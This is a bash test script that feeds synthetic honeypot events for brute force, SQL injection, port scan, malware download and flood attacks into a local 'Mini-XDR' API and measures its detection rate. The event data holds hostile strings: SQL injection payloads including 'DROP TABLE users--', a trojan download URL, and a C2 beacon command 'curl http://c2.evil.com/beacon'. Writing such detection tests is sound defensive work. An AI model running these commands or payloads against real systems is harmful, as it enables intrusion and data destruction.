#!/bin/bash
# Simple Comprehensive Attack Test - No Complex Syntax
set -e

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

# Configuration
MINI_XDR_API="http://localhost:8000"
TOTAL_ATTACKS=0
ATTACKS_DETECTED=0

echo -e "${BLUE}═══════════════════════════════════════════════════${NC}"
echo -e "${BLUE} Mini-XDR Comprehensive Attack Test${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════${NC}\n"

# Generate unique IPs
ATTACKER_IPS=("203.0.113.50" "198.51.100.75" "192.0.2.100" "185.220.101.45" "91.243.80.88")

echo -e "${YELLOW}Generated ${#ATTACKER_IPS[@]} unique attacker IPs${NC}\n"

# Function to ingest events
ingest_attack() {
    local attack_name=$1
    local attacker_ip=$2
    local events_json=$3
    
    echo -e "${CYAN}[Attack $((TOTAL_ATTACKS + 1))]${NC} $attack_name from $attacker_ip"
    
    local payload="{\"source_type\":\"cowrie\",\"hostname\":\"test-honeypot\",\"events\":$events_json}"
    
    response=$(curl -s -X POST "$MINI_XDR_API/ingest/multi" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null || echo '{"processed":0}')
    
    processed=$(echo "$response" | jq -r '.processed' 2>/dev/null || echo "0")
    echo -e "  Ingested: $processed events"
    
    ((TOTAL_ATTACKS++))
    
    sleep 2
    
    # Check for incident
    incidents=$(curl -s "$MINI_XDR_API/incidents?src_ip=$attacker_ip&limit=1" 2>/dev/null || echo '[]')
    count=$(echo "$incidents" | jq '. | length' 2>/dev/null || echo "0")
    
    if [ "$count" -gt 0 ]; then
        echo -e "  ${GREEN}✅ Incident detected!${NC}"
        ((ATTACKS_DETECTED++))
    else
        echo -e "  ${RED}❌ No incident created${NC}"
    fi
    
    echo ""
}

# Attack 1: SSH Brute Force
echo -e "${YELLOW}═══ Test 1: SSH Brute Force ═══${NC}"
EVENTS='['
for i in {1..15}; do
    [ $i -gt 1 ] && EVENTS+=','
    EVENTS+="{\"eventid\":\"cowrie.login.failed\",\"src_ip\":\"${ATTACKER_IPS[0]}\",\"dst_port\":22,\"message\":\"Failed login\",\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.000Z)\",\"raw\":{\"username\":\"admin\",\"password\":\"pass$i\"}}"
done
EVENTS+=']'
ingest_attack "SSH Brute Force" "${ATTACKER_IPS[0]}" "$EVENTS"

# Attack 2: SQL Injection
echo -e "${YELLOW}═══ Test 2: SQL Injection ═══${NC}"
EVENTS='[
{"eventid":"webhoneypot.request","src_ip":"'${ATTACKER_IPS[1]}'","dst_port":80,"message":"SQL injection","timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.000Z)'","raw":{"path":"/login","parameters":"username=admin'\'' OR 1=1--","attack_indicators":["sql_injection"]}},
{"eventid":"webhoneypot.request","src_ip":"'${ATTACKER_IPS[1]}'","dst_port":80,"message":"SQL injection","timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.000Z)'","raw":{"path":"/api","parameters":"id=1 UNION SELECT NULL","attack_indicators":["sql_injection"]}},
{"eventid":"webhoneypot.request","src_ip":"'${ATTACKER_IPS[1]}'","dst_port":80,"message":"SQL injection","timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.000Z)'","raw":{"path":"/search","parameters":"q=test'\''; DROP TABLE users--","attack_indicators":["sql_injection"]}}
]'
ingest_attack "SQL Injection" "${ATTACKER_IPS[1]}" "$EVENTS"

# Attack 3: Port Scan
echo -e "${YELLOW}═══ Test 3: Port Scan ═══${NC}"
EVENTS='['
for port in 21 22 23 25 80 110 143 443 445 3389; do
    [ "$port" != 21 ] && EVENTS+=','
    EVENTS+="{\"eventid\":\"suricata.alert\",\"src_ip\":\"${ATTACKER_IPS[2]}\",\"dst_port\":$port,\"message\":\"Port scan\",\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.000Z)\",\"raw\":{\"alert\":{\"signature\":\"Port scan\",\"severity\":2}}}"
done
EVENTS+=']'
ingest_attack "Port Scan" "${ATTACKER_IPS[2]}" "$EVENTS"

# Attack 4: Malware Download
echo -e "${YELLOW}═══ Test 4: Malware Download ═══${NC}"
EVENTS='[
{"eventid":"cowrie.session.file_download","src_ip":"'${ATTACKER_IPS[3]}'","dst_port":22,"message":"Malware download","timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.000Z)'","raw":{"url":"http://malware.com/trojan.exe","test_type":"malware"}},
{"eventid":"cowrie.command.input","src_ip":"'${ATTACKER_IPS[3]}'","dst_port":22,"message":"Malware execution","timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.000Z)'","raw":{"input":"chmod +x malware","test_type":"malware"}},
{"eventid":"cowrie.command.input","src_ip":"'${ATTACKER_IPS[3]}'","dst_port":22,"message":"C2 beacon","timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.000Z)'","raw":{"input":"curl http://c2.evil.com/beacon","test_type":"malware"}}
]'
ingest_attack "Malware Download" "${ATTACKER_IPS[3]}" "$EVENTS"

# Attack 5: DDoS Simulation
echo -e "${YELLOW}═══ Test 5: DDoS Attack ═══${NC}"
EVENTS='['
for i in {1..150}; do
    [ $i -gt 1 ] && EVENTS+=','
    EVENTS+="{\"eventid\":\"suricata.flow\",\"src_ip\":\"${ATTACKER_IPS[4]}\",\"dst_port\":80,\"message\":\"HTTP flood\",\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.000Z)\",\"raw\":{\"proto\":\"TCP\"}}"
done
EVENTS+=']'
ingest_attack "DDoS Attack" "${ATTACKER_IPS[4]}" "$EVENTS"

# Summary
echo -e "${BLUE}═══════════════════════════════════════════════════${NC}"
echo -e "${BLUE} Test Summary${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════${NC}\n"

echo "Total Attacks: $TOTAL_ATTACKS"
echo "Attacks Detected: $ATTACKS_DETECTED"

if [ $TOTAL_ATTACKS -gt 0 ]; then
    RATE=$(awk "BEGIN {printf \"%.1f\", ($ATTACKS_DETECTED/$TOTAL_ATTACKS)*100}")
    echo -e "Detection Rate: ${GREEN}${RATE}%${NC}"
    
    if (( $(echo "$RATE >= 80" | bc -l) )); then
        echo -e "\n${GREEN}✅ SUCCESS: Detection rate >= 80%${NC}"
    else
        echo -e "\n${YELLOW}⚠️  WARNING: Detection rate < 80%${NC}"
    fi
fi

echo -e "\n${CYAN}View incidents: curl http://localhost:8000/incidents | jq${NC}\n"

